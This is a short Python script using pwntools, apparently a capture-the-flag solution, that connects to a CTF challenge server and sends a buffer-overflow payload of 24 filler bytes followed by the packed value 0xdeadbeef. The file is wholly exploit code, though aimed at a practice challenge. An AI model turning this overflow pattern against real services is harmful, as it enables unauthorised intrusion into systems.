from pwn import *

target = remote("pwn.katagaitai-ctf.com", 9012)
# target = process("./chall")

payload = b"A" * 24
payload += p64(0xdeadbeef)

target.sendline(payload)
print(target.recvall().decode())